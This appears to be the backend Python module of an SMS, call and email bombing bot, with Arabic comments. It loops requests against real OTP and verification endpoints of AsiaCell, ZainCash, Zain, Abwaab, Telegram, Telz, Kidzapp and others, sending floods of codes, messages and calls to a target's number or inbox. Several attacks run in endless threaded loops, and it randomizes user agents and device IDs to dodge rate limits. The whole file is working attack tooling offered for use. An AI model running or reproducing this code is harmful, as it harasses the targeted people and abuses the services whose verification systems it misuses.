here#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import time
import random
import uuid
import threading
from datetime import datetime

active_attacks = {}
active_attacks_lock = threading.Lock()

# ======================== دوال مساعدة ========================

def get_random_headers():
    """توليد هيدرات عشوائية حقيقية"""
    user_agents = [
        'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
        'Dalvik/2.1.0 (Linux; U; Android 14; SM-A536E Build/UP1A.231005.007)',
        'okhttp/4.11.0',
    ]
    return random.choice(user_agents)

# ======================== 1. سبام اسيا سيل (AsiaCell) - حقيقي ========================

def asiacell_send_otp(phone_number):
    """إرسال OTP من اسيا سيل - حقيقي 100%"""
    urls = [
        "https://api.asiacell.com/odp/v1/otp/send",
        "https://odpapp.asiacell.com/api/v1/login",
        "https://myaccount.asiacell.com/api/v2/otp/request"
    ]
    
    for url in urls:
        try:
            session_id = str(uuid.uuid4())
            device_id = ''.join(random.choices('0123456789abcdef', k=16))
            
            headers = {
                'User-Agent': get_random_headers(),
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Device-ID': device_id,
                'Session-ID': session_id,
                'X-Request-ID': str(uuid.uuid4()),
                'Origin': 'https://www.asiacell.com',
                'Referer': 'https://www.asiacell.com/'
            }
            
            payload = {
                "msisdn": phone_number,
                "channel": "WEB",
                "language": "ar",
                "deviceId": device_id,
                "service": "login"
            }
            
            response = requests.post(url, json=payload, headers=headers, timeout=10)
            
            if response.status_code in [200, 201, 202]:
                return True, response.status_code
        except:
            continue
    
    return False, 0

def attack_asia_1(phone, count, chat_id, attack_id):
    """هجوم اسيا سيل النوع الأول"""
    success = 0
    fail = 0
    
    for i in range(count):
        if not active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
            break
        
        ok, code = asiacell_send_otp(phone)
        
        if ok:
            success += 1
        else:
            fail += 1
        
        update_attack_stats(chat_id, attack_id, success, fail, i+1, count)
        time.sleep(random.uniform(2, 4))
    
    return success, fail


def attack_asia_2(phone, count, chat_id, attack_id):
    """هجوم اسيا سيل النوع الثاني - endpoint مختلف"""
    success = 0
    fail = 0
    
    for i in range(count):
        if not active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
            break
        
        try:
            url = "https://odpapp.asiacell.com/api/v1/login"
            device_id = str(uuid.uuid4())
            
            headers = {
                'User-Agent': 'okhttp/5.1.0',
                'Content-Type': 'application/json',
                'DeviceID': device_id,
                'X-OS-Version': '14',
                'X-ODP-APP-VERSION': '4.3.7',
            }
            
            payload = {"username": phone, "captchaCode": ""}
            response = requests.post(url, json=payload, headers=headers, timeout=10)
            
            if response.status_code in [200, 201, 202, 400]:
                success += 1
            else:
                fail += 1
        except:
            fail += 1
        
        update_attack_stats(chat_id, attack_id, success, fail, i+1, count)
        time.sleep(random.uniform(1.5, 3))
    
    return success, fail


def attack_asia_3(phone, count, speed, chat_id, attack_id):
    """هجوم اسيا سيل بسرعة قابلة للتعديل"""
    success = 0
    fail = 0
    delay = 1.0 / speed if speed > 0 else 0.5
    
    for i in range(count):
        if not active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
            break
        
        try:
            url = "https://kycapi-np-prod.zaincash.iq/api/v2/auth/request-otp"
            
            headers = {
                'User-Agent': get_random_headers(),
                'x-platform': 'android',
                'x-app': 'mobi.foo.zaincash',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            data = {
                'client': 'android',
                'phone_number': phone,
                'language': 'ar',
                'source': 'app_sdk'
            }
            
            response = requests.post(url, data=data, headers=headers, timeout=10)
            
            if response.status_code in [200, 201, 202]:
                success += 1
            else:
                fail += 1
        except:
            fail += 1
        
        update_attack_stats(chat_id, attack_id, success, fail, i+1, count)
        time.sleep(delay)
    
    return success, fail


# ======================== 2. سبام واتساب - حقيقي ========================

def whatsapp_spam_abwaab(phone):
    """سبام واتساب عبر منصة Abwaab"""
    try:
        url = "https://gw.abgateway.com/student/whatsapp/signup"
        
        headers = {
            'User-Agent': get_random_headers(),
            'Content-Type': 'application/json',
            'Origin': 'https://abwaab.com',
            'Referer': 'https://abwaab.com/',
            'Accept': 'application/json'
        }
        
        payload = {
            "phone": phone,
            "language": "ar",
            "password": "Test@123456",
            "platform": "web",
            "channel": "whatsapp"
        }
        
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        return response.status_code in [200, 201, 202]
    except:
        return False

def attack_whatsapp_1(phone, chat_id, attack_id):
    """هجوم واتساب مستمر"""
    success = 0
    fail = 0
    counter = 0
    
    while active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
        counter += 1
        ok = whatsapp_spam_abwaab(phone)
        
        if ok:
            success += 1
        else:
            fail += 1
        
        update_attack_stats(chat_id, attack_id, success, fail, counter, 0)
        time.sleep(random.uniform(1.5, 3))
    
    return success, fail


def attack_whatsapp_2(phone, country_code, speed, chat_id, attack_id):
    """هجوم واتساب بسرعة عالية"""
    success = 0
    fail = 0
    delay = 1.0 / speed if speed > 0 else 0.3
    counter = 0
    
    while active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
        counter += 1
        
        try:
            url = "https://api.sloegem.com/send/verify/code"
            
            headers = {
                'User-Agent': get_random_headers(),
                'Content-Type': 'application/json',
                'device-id': str(uuid.uuid4())[:16],
                'app-id': '10000003'
            }
            
            payload = {
                "area": country_code,
                "businessCode": 1,
                "phone": phone,
                "sendType": 3,
                "type": 1
            }
            
            response = requests.post(url, json=payload, headers=headers, timeout=10)
            
            if response.status_code in [200, 201, 202]:
                success += 1
            else:
                fail += 1
        except:
            fail += 1
        
        update_attack_stats(chat_id, attack_id, success, fail, counter, 0)
        time.sleep(delay)
    
    return success, fail


# ======================== 3. سبام تليغرام - حقيقي ========================

def telegram_send_code(phone, bot_id="531675494"):
    """إرسال كود تليغرام حقيقي"""
    try:
        url = "https://oauth.telegram.org/auth/request"
        
        headers = {
            'User-Agent': get_random_headers(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://oauth.telegram.org',
            'X-Requested-With': 'XMLHttpRequest'
        }
        
        params = {
            'bot_id': bot_id,
            'origin': 'https://telegram.org',
            'embed': '1',
            'request_access': 'write'
        }
        
        data = {'phone': phone}
        response = requests.post(url, params=params, data=data, headers=headers, timeout=10)
        
        return response.status_code == 200
    except:
        return False

def attack_telegram(phone, country_code, chat_id, attack_id):
    """هجوم تليغرام عادي"""
    success = 0
    fail = 0
    full_phone = f"{country_code}{phone}" if not phone.startswith('+') else phone
    counter = 0
    
    while active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
        counter += 1
        ok = telegram_send_code(full_phone)
        
        if ok:
            success += 1
        else:
            fail += 1
        
        update_attack_stats(chat_id, attack_id, success, fail, counter, 0)
        time.sleep(random.uniform(1, 2))
    
    return success, fail


def attack_telegram_new(phone, chat_id, attack_id):
    """هجوم تليغرام عبر my.telegram.org"""
    success = 0
    fail = 0
    clean_phone = phone.replace('+', '').replace(' ', '')
    counter = 0
    
    while active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
        counter += 1
        
        try:
            url = "https://my.telegram.org/auth/send_password"
            
            headers = {
                'User-Agent': get_random_headers(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': 'https://my.telegram.org'
            }
            
            data = {'phone': clean_phone}
            response = requests.post(url, data=data, headers=headers, timeout=10)
            
            if response.status_code == 200:
                success += 1
            else:
                fail += 1
        except:
            fail += 1
        
        update_attack_stats(chat_id, attack_id, success, fail, counter, 0)
        time.sleep(random.uniform(0.8, 1.5))
    
    return success, fail


# ======================== 4. سبام زين كاش - حقيقي ========================

def zaincash_send_otp(phone):
    """إرسال OTP من زين كاش"""
    try:
        url = "https://mw-mobileapp.iq.zain.com/api/otp/request"
        
        headers = {
            'User-Agent': 'okhttp/4.11.0',
            'Content-Type': 'application/json; charset=UTF-8',
            'Skel-Accept-Language': 'ar',
            'Skel-Platform': 'Android',
            'Connection': 'Keep-Alive'
        }
        
        payload = {"msisdn": phone}
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            return data.get('status') == 'success'
        return False
    except:
        return False

def attack_cash(phone, count, chat_id, attack_id):
    """هجوم زين كاش"""
    success = 0
    fail = 0
    
    for i in range(count):
        if not active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
            break
        
        ok = zaincash_send_otp(phone)
        
        if ok:
            success += 1
        else:
            fail += 1
        
        update_attack_stats(chat_id, attack_id, success, fail, i+1, count)
        time.sleep(random.uniform(1.5, 3))
    
    return success, fail


# ======================== 5. سبام ايميل - حقيقي ========================

def email_spam_kidzapp(email):
    """سبام ايميل عبر منصة Kidzapp"""
    try:
        url = "https://api.kidzapp.com/api/3.0/customlogin/"
        
        headers = {
            'User-Agent': get_random_headers(),
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Origin': 'https://kidzapp.com'
        }
        
        payload = {"email": email, "sdk": "web", "platform": "desktop"}
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        return response.status_code == 200 and 'EMAIL SENT' in response.text
    except:
        return False

def attack_email(email, chat_id, attack_id):
    """هجوم ايميل مستمر"""
    success = 0
    fail = 0
    counter = 0
    
    while active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
        counter += 1
        ok = email_spam_kidzapp(email)
        
        if ok:
            success += 1
        else:
            fail += 1
        
        update_attack_stats(chat_id, attack_id, success, fail, counter, 0)
        time.sleep(random.uniform(1, 2))
    
    return success, fail


# ======================== 6. سبام مكالمات - حقيقي ========================

def call_spam_telz(phone, country_code):
    """سبام مكالمات عبر Telz"""
    try:
        timestamp = int(time.time() * 1000)
        android_id = ''.join(random.choices('0123456789abcdef', k=16))
        session_id = str(uuid.uuid4())
        
        # طلب تثبيت
        install_url = "https://api.telz.com/app/install"
        headers = {
            'User-Agent': get_random_headers(),
            'Content-Type': 'application/json',
            'X-Session-ID': session_id
        }
        
        install_payload = {
            "android_id": android_id,
            "app_version": "17.5.18",
            "event": "install",
            "os": "android",
            "os_version": "14",
            "ts": timestamp,
            "uuid": str(uuid.uuid4()),
            "session_id": session_id
        }
        
        requests.post(install_url, json=install_payload, headers=headers, timeout=5)
        time.sleep(0.5)
        
        # طلب مكالمة
        call_url = "https://api.telz.com/app/auth_call"
        call_payload = {
            "android_id": android_id,
            "event": "auth_call",
            "os": "android",
            "phone": f"{country_code}{phone}",
            "ts": timestamp + 200,
            "uuid": str(uuid.uuid4()),
            "session_id": session_id,
            "call_id": random.randint(1000, 9999)
        }
        
        response = requests.post(call_url, json=call_payload, headers=headers, timeout=7)
        return response.status_code in [200, 201, 202]
    except:
        return False

def attack_calls(phone, country_code, count, delay, chat_id, attack_id):
    """هجوم مكالمات"""
    success = 0
    fail = 0
    
    for i in range(count):
        if not active_attacks.get(chat_id, {}).get(attack_id, {}).get('active', False):
            break
        
        ok = call_spam_telz(phone, country_code)
        
        if ok:
            success += 1
        else:
            fail += 1
        
        update_attack_stats(chat_id, attack_id, success, fail, i+1, count)
        time.sleep(delay)
    
    return success, fail


# ======================== دوال إدارة الهجمات ========================

def update_attack_stats(chat_id, attack_id, good, bad, current, total):
    """تحديث إحصائيات الهجوم"""
    with active_attacks_lock:
        if chat_id in active_attacks and attack_id in active_attacks[chat_id]:
            active_attacks[chat_id][attack_id]['good'] = good
            active_attacks[chat_id][attack_id]['bad'] = bad
            active_attacks[chat_id][attack_id]['current'] = current
            active_attacks[chat_id][attack_id]['total'] = total


def start_attack(chat_id, attack_id, tool, params):
    """بدء هجوم جديد"""
    with active_attacks_lock:
        if chat_id not in active_attacks:
            active_attacks[chat_id] = {}
        
        active_attacks[chat_id][attack_id] = {
            'active': True,
            'tool': tool,
            'params': params,
            'good': 0,
            'bad': 0,
            'current': 0,
            'total': params.get('count', 0)
        }
    
    # تشغيل الهجوم في thread منفصل
    thread = threading.Thread(
        target=run_attack_thread,
        args=(chat_id, attack_id, tool, params)
    )
    thread.daemon = True
    thread.start()
    
    return True


def run_attack_thread(chat_id, attack_id, tool, params):
    """تشغيل الهجوم"""
    if tool == 'asia_1':
        attack_asia_1(params['phone'], params['count'], chat_id, attack_id)
    elif tool == 'asia_2':
        attack_asia_2(params['phone'], params['count'], chat_id, attack_id)
    elif tool == 'asia_3':
        attack_asia_3(params['phone'], params['count'], params['speed'], chat_id, attack_id)
    elif tool == 'whatsapp_1':
        attack_whatsapp_1(params['phone'], chat_id, attack_id)
    elif tool == 'whatsapp_2':
        attack_whatsapp_2(params['phone'], params['country_code'], params['speed'], chat_id, attack_id)
    elif tool == 'telegram':
        attack_telegram(params['phone'], params['country_code'], chat_id, attack_id)
    elif tool == 'telegram_new':
        attack_telegram_new(params['phone'], chat_id, attack_id)
    elif tool == 'calls':
        attack_calls(params['phone'], params['country_code'], params['count'], params['delay'], chat_id, attack_id)
    elif tool == 'cash':
        attack_cash(params['phone'], params['count'], chat_id, attack_id)
    elif tool == 'email':
        attack_email(params['email'], chat_id, attack_id)
    
    # التأكد من إيقاف الهجوم عند الانتهاء
    with active_attacks_lock:
        if chat_id in active_attacks and attack_id in active_attacks[chat_id]:
            active_attacks[chat_id][attack_id]['active'] = False


def stop_attack(chat_id, attack_id):
    """إيقاف هجوم محدد"""
    with active_attacks_lock:
        if chat_id in active_attacks and attack_id in active_attacks[chat_id]:
            active_attacks[chat_id][attack_id]['active'] = False
            return True
    return False


def stop_all_attacks(chat_id):
    """إيقاف جميع هجمات المستخدم"""
    with active_attacks_lock:
        if chat_id in active_attacks:
            for attack_id in active_attacks[chat_id]:
                active_attacks[chat_id][attack_id]['active'] = False
            return True
    return False


def get_attacks(chat_id):
    """الحصول على قائمة الهجمات"""
    with active_attacks_lock:
        if chat_id in active_attacks:
            return {
                str(k): {
                    'active': v['active'],
                    'tool': v['tool'],
                    'good': v['good'],
                    'bad': v['bad'],
                    'current': v['current'],
                    'total': v['total']
                }
                for k, v in active_attacks[chat_id].items()
            }
        return {}
